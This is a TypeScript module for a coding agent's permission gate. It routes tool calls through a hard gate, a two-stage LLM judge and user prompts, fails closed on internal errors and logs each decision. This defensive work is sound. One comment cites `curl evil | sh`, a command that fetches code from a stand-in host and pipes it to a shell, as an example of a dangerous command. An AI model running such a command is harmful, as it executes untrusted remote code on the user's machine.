import type { ExtensionContext } from "@earendil-works/pi-coding-agent";
import type { PermissionRequest, Decision, PromptData, DecideOptions } from "./decision-engine";
import { decide } from "./decision-engine";
import { pdTargetLabel } from "./prompt-builder";
import { logDecision, logUnresolved, type DspModeTag } from "./decision-log";
import { showPrompt, type DspaFallthrough } from "./prompt-flow";
import type { Store } from "./store";
import { isDspaActive, recordDspaAutoAllowed, updateDspaWidget } from "./dspa-mode";
import { isDspatActive } from "./dspat-mode";
import { checkDspaGate } from "./dspa-gate";
import { getJudgeVerdict, getStage2Verdict, judgeStatus, extractScriptPayload } from "./judge-prompt";
import { judgePathLogFields } from "./judge-paths";
import { PromptFallbackRule } from "./policies/bash-rules";
import type { JudgeResult } from "./judge";

/** Result of showing a permission prompt. */
interface PromptResult {
  allowed: boolean;
  reason?: string;
}

/**
 * Refcount for the tools-panel expansion hack. `setToolsExpanded(true)` before a
 * prompt makes the tool list visible; the restore must not collapse the panel
 * while another (parallel) prompt is still showing. Only the call that first
 * expanded restores — and only when the last concurrent user is done.
 */
let toolExpansionDepth = 0;
let toolExpansionBase = false;

function expandTools(ctx: ExtensionContext): void {
  if (toolExpansionDepth === 0) {
    toolExpansionBase = ctx.ui.getToolsExpanded();
    if (!toolExpansionBase) ctx.ui.setToolsExpanded(true);
  }
  toolExpansionDepth++;
}

function restoreTools(ctx: ExtensionContext): void {
  toolExpansionDepth = Math.max(0, toolExpansionDepth - 1);
  if (toolExpansionDepth === 0) ctx.ui.setToolsExpanded(toolExpansionBase);
}

/**
 * Callback invoked when the user rejects a permission.
 * The handler is responsible for recording aborts, formatting the rejection reason,
 * and sending the UI notification.
 */
type RejectHandler = (
  decision: Decision,
  result: PromptResult,
) => { block: true; reason: string };

/**
 * The dspa stop-tag for the decision log: which layer stopped the
 * auto-allow — the deterministic hard gate (its code-produced reason is
 * safe to accumulate) or the judge (only the declined/failed fact; a
 * REJECT's explanation is logged separately via dspaJudgeDeny as a debug
 * aid — verdict stats stay session-scoped by design).
 * The stage is plumbing (which judge layer decided), not verdict content:
 *  - `judge: declined (stage 2)` — the intent pass rendered a verdict that
 *    did not auto-allow (the final call on the operation);
 *  - `judge: stage 2 failed` — the stateless pass rendered a verdict but
 *    the intent pass produced none (timeout/auth/model — an infra fact);
 *  - `judge: <note>` — no verdict at all.
 * undefined outside dspa prompt fall-throughs.
 */
function dspaStopTag(f: DspaFallthrough | undefined): string | undefined {
  if (!f) return undefined;
  if (!f.gate.ok) return `gate: ${f.gate.reason}`;
  if (f.verdict) return f.stage === 2 ? "judge: declined (stage 2)" : "judge: stage 2 failed";
  return `judge: ${f.note ?? "no verdict"}`;
}

/**
 * The LLM's reject words for the decision log (the NOTE's debug exception
 * in decision-log.ts): the FINAL verdict's explanation when it is a
 * REJECT. Which layer stopped first does not matter for debugging the
 * judge — the stop tag already says that; this is what the model said.
 */
function dspaJudgeDeny(f: DspaFallthrough | undefined): string | undefined {
  if (!f?.verdict || f.verdict.approve !== "deny") return undefined;
  return f.verdict.explanation;
}

/** Record + surface one dspa auto-allow (D6: the log reason carries the
 * stage — which judge layer approved — and the model that rendered it). */
function dspaAutoAllowed(
  request: PermissionRequest,
  pd: PromptData,
  ctx: ExtensionContext,
  store: Store,
  verdict: JudgeResult,
  stage: 1 | 2,
): void {
  // D13: a stage-2 auto-allow logs the judge's path report (and any path
  // the floor never saw) — the parser-gap probe. Stage 1 never reports.
  const jp = stage === 2 ? judgePathLogFields(pd, store, verdict.paths) : {};
  logDecision(request, { kind: "auto-allow", reason: `dspa: judge approved (stage ${stage}, ${verdict.model})` }, "dspa", undefined, undefined, jp.judgePaths, jp.judgePathMisses);
  // Unresolved-token log: an auto-allow of a command WITH unresolved tokens
  // means their resolutions were already user-confirmed — the convergence
  // end-state (no prompt, no LLM call for the scope).
  if (pd.type === "bash" && pd.unresolved?.length) {
    for (const u of pd.unresolved) {
      logUnresolved({
        cmd: pd.command,
        cwd: pd.cwd,
        token: u.token,
        llm: store.getConfirmedResolution(u.token) ?? undefined,
        persisted: true,
        outcome: "auto-allowed",
        decision: "auto-allow",
      });
    }
  }
  try {
    ctx.ui.notify(`✓ Judge auto-allowed (stage ${stage}): ${verdict.explanation}`, "info");
  } catch {
    /* toast must never break the allow */
  }
  recordDspaAutoAllowed(verdict.model, pdTargetLabel(pd));
  updateDspaWidget(ctx);
}

/**
 * Two-stage dspa attempt (docs/dspa-redesign.md, D2/Q4):
 *  1. Hard gate (dspa-gate.ts) — the floor; failure → fall-through.
 *  2. Stage 1 (stateless, cached): approve+low → auto-allow.
 *  3. Stage 2 (reasoning-blind session context, uncached): runs when stage
 *     1 did not auto-allow; approve+{low, medium} → auto-allow. Its verdict
 *     is final — approve+high and reject never auto-allow (phase 2: both
 *     still prompt; the phase-3 denial flow changes only the destination).
 * Any judge failure resolves to fall-through — never an allow.
 */
async function tryDspaAutoAllow(
  request: PermissionRequest,
  decision: Extract<Decision, { kind: "prompt" }>,
  ctx: ExtensionContext,
  store: Store,
): Promise<{ autoAllowed: boolean; fallthrough: DspaFallthrough }> {
  const pd = decision.promptData;
  const gateResult = await checkDspaGate(pd, store);
  if (!gateResult.ok) {
    // D10/D11 (docs/dspa-redesign.md): scope-class stops (outside base,
    // unresolvable location) and untrusted packages stop the auto-allow, but
    // the judge still runs both stages — its verdict renders in the prompt
    // as advisory input to the allow/deny/grant decision (a verdict on
    // `curl evil | sh` would be noise — danger-class stops stay bare).
    // Never an auto-allow: the floor's stop stands.
    if (gateResult.advisory) {
      const v1 = await getJudgeVerdict(pd, ctx, store);
      const v2 = await getStage2Verdict(pd, ctx, store);
      const final = (v2 ?? v1) ?? null;
      return {
        autoAllowed: false,
        fallthrough: {
          gate: gateResult,
          verdict: final,
          stage: v2 ? 2 : v1 ? 1 : null,
          untrustedPackages: gateResult.untrustedPackages,
        },
      };
    }
    return { autoAllowed: false, fallthrough: { gate: gateResult, verdict: null, stage: null } };
  }
  // Stage 1 — stateless (the packet's static analysis is the whole input).
  const v1 = await getJudgeVerdict(pd, ctx, store);
  if (v1 && v1.approve === "approve" && v1.risk === "low") {
    dspaAutoAllowed(request, pd, ctx, store, v1, 1);
    return { autoAllowed: true, fallthrough: { gate: gateResult, verdict: v1, stage: 1 } };
  }
  // Stage 2 — intent pass (session context, uncached, final verdict).
  const v2 = await getStage2Verdict(pd, ctx, store);
  if (v2 && v2.approve === "approve" && (v2.risk === "low" || v2.risk === "medium")) {
    dspaAutoAllowed(request, pd, ctx, store, v2, 2);
    return { autoAllowed: true, fallthrough: { gate: gateResult, verdict: v2, stage: 2 } };
  }
  // Gate passed but neither stage auto-allowed. The fall-through prompt
  // carries the FINAL verdict (stage 2 when it rendered one); when a stage
  // produced no verdict, say WHY so the prompt is never silently bare.
  const final = (v2 ?? v1) ?? null;
  let note: string | undefined;
  if (!v2 && !v1) {
    const jstatus = judgeStatus(ctx);
    note = jstatus.state === "invalid" ? `judge invalid: ${jstatus.reason}` : "judge call failed";
  } else if (v1 && !v2) {
    note = "stage 2 (session context) unavailable — stateless verdict only";
  }
  return {
    autoAllowed: false,
    fallthrough: { gate: gateResult, verdict: final, stage: v2 ? 2 : v1 ? 1 : null, note },
  };
}

/**
 * Shared permission gate: decide → dispatch → prompt → reject.
 *
 * Encapsulates the common flow shared by all handlers:
 *  1. Call decide() to get auto-allow / block / prompt
 *  2. Auto-allow → proceed (return undefined)
 *  3. Block → return block immediately
 *  4. No UI → handler provides a block reason
 *  5. Prompt → show prompt, handle rejection via onReject
 *
 * The handler only needs to provide request construction and rejection formatting.
 *
 * @param precomputedDecision - Optional decision already computed by the handler
 *   (avoids a second decide() call when the handler needed the decision anyway,
 *   e.g. to gate pre-validation reads on the outcome).
 */
export async function gate(
  request: PermissionRequest,
  ctx: ExtensionContext,
  store: Store,
  onReject: RejectHandler,
  precomputedDecision?: Decision,
): Promise<undefined | { block: true; reason: string }> {
  let decision = precomputedDecision ?? await gateDecide(request, store, ctx);

  // D3/D11 (docs/dspa-redesign.md): in dspa, a file WRITE that manual mode
  // would auto-allow is JUDGEABLE, not a blind auto-allow — the location is
  // trusted, the content is judged in full (two stages, same policy as
  // bash). The probe re-decides with judgeWriteAutoAllows: every write
  // auto-allow fast path converts (reads are never judged). Manual/dspat
  // and non-file decisions are untouched. Judge off/invalid → no conversion
  // (degrades to the manual auto-allow — dspa never adds a prompt on its
  // own; a runtime judge failure still falls toward the prompt, D6).
  if (decision.kind === "auto-allow" && request.type === "file"
      && request.toolName !== "read" && isDspaActive() && ctx.hasUI
      && judgeStatus(ctx).state === "ok") {
    const probed = await gateDecide(request, store, ctx, { judgeWriteAutoAllows: true });
    if (probed.kind === "prompt") decision = probed;
  }

  // D11 (docs/dspa-redesign.md): in dspa, a bash auto-allow that runs a
  // reviewable script payload (granted interpreter execution) is judged —
  // the grant trusts the command form, the content is still reviewed (two
  // stages, same policy). The deterministic floor is moot on a manual
  // auto-allow: it already passed every danger check (canBeAutoAllowed,
  // credential paths, network, D10 trust). The conversion builds the
  // manual-shaped prompt (PromptFallbackRule) so the shared dspa block below
  // handles gate → judge → auto-allow / prompt-with-verdict uniformly.
  // Payload-less commands and reads are never judged; judge off/invalid →
  // no conversion (manual auto-allow stands).
  if (decision.kind === "auto-allow" && request.type === "bash"
      && isDspaActive() && ctx.hasUI
      && judgeStatus(ctx).state === "ok") {
    const analysis = decision.analysis;
    if (analysis && extractScriptPayload(analysis, request.cwd) !== null) {
      const synthetic = await PromptFallbackRule(request, store, analysis);
      if (synthetic?.kind === "prompt") decision = synthetic;
    }
  }

  // /dspa: a prompt decision may be auto-allowed (hard gate + judge). This
  // runs BEFORE the log line so the log records the outcome, not the
  // pre-dspa decision. Any internal failure here must not block the normal
  // prompt path — the whole attempt is best-effort.
  let dspaFallthrough: DspaFallthrough | undefined;
  if (decision.kind === "prompt" && isDspaActive() && ctx.hasUI) {
    try {
      const { autoAllowed, fallthrough } = await tryDspaAutoAllow(request, decision, ctx, store);
      if (autoAllowed) return;
      dspaFallthrough = fallthrough;
    } catch {
      /* fall through to the normal prompt */
    }
  }

  // Decision log (JSONL): one line per tool call, including fail-closed
  // synthetic blocks. Fire-and-forget — logDecision never throws.
  // D13: a dspa fall-through whose FINAL verdict is stage 2 logs the judge's
  // path report + floor mismatches — the richest parser-gap case is a floor
  // stop where the judge saw paths the static analysis never did.
  const judgePathFields =
    decision.kind === "prompt" && dspaFallthrough?.stage === 2
      ? judgePathLogFields(decision.promptData, store, dspaFallthrough.verdict?.paths)
      : {};
  logDecision(
    request,
    decision,
    dspModeTag(decision, ctx),
    dspaStopTag(dspaFallthrough),
    dspaJudgeDeny(dspaFallthrough),
    judgePathFields.judgePaths,
    judgePathFields.judgePathMisses,
  );

  if (decision.kind === "auto-allow") return;

  if (decision.kind === "block") {
    return { block: true, reason: decision.reason };
  }

  // No UI available — block
  if (!ctx.hasUI) {
    return { block: true, reason: "[Permission Policy] Auto-blocked (no UI): requires confirmation" };
  }

  expandTools(ctx);

  try {
    const result = await showPrompt(decision, ctx, store, dspaFallthrough);
    if (!result.allowed) {
      return onReject(decision, result);
    }
  } finally {
    restoreTools(ctx);
  }

  return;
}

/**
 * The dsp regime tag for the decision log (see DspModeTag): a prompt shown
 * while /dspa or /dspat was active is tagged with that mode (under /dspa it
 * is a judge fall-through; under /dspat the prompt carried the verdict).
 * Gate-only decisions — auto-allow, block, a prompt in manual mode, or any
 * decision without a UI (where the judge modes never run) — stay untagged.
 * The modes are exclusive (index.ts), so at most one applies.
 */
function dspModeTag(decision: Decision, ctx: ExtensionContext): DspModeTag | undefined {
  if (decision.kind !== "prompt" || !ctx.hasUI) return undefined;
  if (isDspaActive()) return "dspa";
  if (isDspatActive()) return "dspat";
  return undefined;
}

/**
 * Run decide() with a fail-closed guard: an internal analysis crash must
 * never resolve to "allowed". pi's agent loop also converts handler
 * exceptions into tool errors, but this invariant belongs to the gate — it
 * must hold even if the extension runs outside pi (evals, embeds, refactors).
 */
export async function gateDecide(
  request: PermissionRequest,
  store: Store,
  ctx: ExtensionContext,
  opts?: DecideOptions,
): Promise<Decision> {
  try {
    return await decide(request, store, opts);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    try {
      if (ctx.hasUI) ctx.ui.notify("Permission gate failed closed (internal error)", "error");
    } catch {
      // Notification must never mask the block.
    }
    return {
      kind: "block",
      reason: `[INTERNAL ERROR] Permission analysis failed — blocked (fail closed): ${msg.slice(0, 200)}`,
    };
  }
}

// ── Helper: construct rejection reason + notify ────────────────────────

/**
 * Common reject handler for bash commands.
 * Records abort, formats reason with risk details, sends notification.
 */
export function rejectBash(
  decision: Decision,
  result: PromptResult,
  store: Store,
  ctx: ExtensionContext,
): { block: true; reason: string } {
  if (decision.kind !== "prompt") return { block: true, reason: "Permission denied" };

  const pd = decision.promptData;
  if (pd.type !== "bash") return { block: true, reason: "Permission denied" };

  store.recordAbort(pd.command);

  const detail = pd.riskDangerous
    ? ` Danger flags: ${pd.riskReasons.join(", ")}.`
    : "";
  const reasonDetail = result.reason ? ` Reason: ${result.reason}.` : "";

  ctx.ui.notify(
    `Permission denied: ${pd.riskDangerous ? "dangerous " : ""}bash command`,
    "error",
  );

  return {
    block: true,
    reason: `[USER REJECTED] Bash command rejected: ${pd.command.slice(0, 120)}.${detail}${reasonDetail}`,
  };
}

/**
 * Common reject handler for file operations.
 * Formats reason with action and path info, sends notification.
 * Does NOT record abort (file accesses are deterministic).
 */
export function rejectFile(
  decision: Decision,
  result: PromptResult,
  store: Store,
  ctx: ExtensionContext,
): { block: true; reason: string } {
  if (decision.kind !== "prompt") return { block: true, reason: "Permission denied" };

  const pd = decision.promptData;
  if (pd.type !== "file") return { block: true, reason: "Permission denied" };

  const action = pd.action.toLowerCase();
  const resolved = pd.resolved;
  const reasonDetail = result.reason ? ` Reason: ${result.reason}.` : "";

  ctx.ui.notify(`Permission denied: ${action} ${pd.filePath.split("/").pop() || pd.filePath}`, "error");

  return {
    block: true,
    reason: `[USER REJECTED] ${action} access to ${pd.filePath.split("/").pop() || pd.filePath} (${resolved}) rejected.${reasonDetail}`,
  };
}

/**
 * Reject handler for plugin-gated tool calls. No abort record (tool calls
 * are deterministic, like file ops — the abort tracker is a bash retry-loop
 * guard).
 */
export function rejectTool(
  decision: Decision,
  result: PromptResult,
  store: Store,
  ctx: ExtensionContext,
): { block: true; reason: string } {
  if (decision.kind !== "prompt") return { block: true, reason: "Permission denied" };

  const pd = decision.promptData;
  if (pd.type !== "tool") return { block: true, reason: "Permission denied" };

  const reasonDetail = result.reason ? ` Reason: ${result.reason}.` : "";

  ctx.ui.notify(`Permission denied: ${pd.tool} ${pd.label}`, "error");

  return {
    block: true,
    reason: `[USER REJECTED] ${pd.tool} '${pd.label}' rejected.${reasonDetail}`,
  };
}

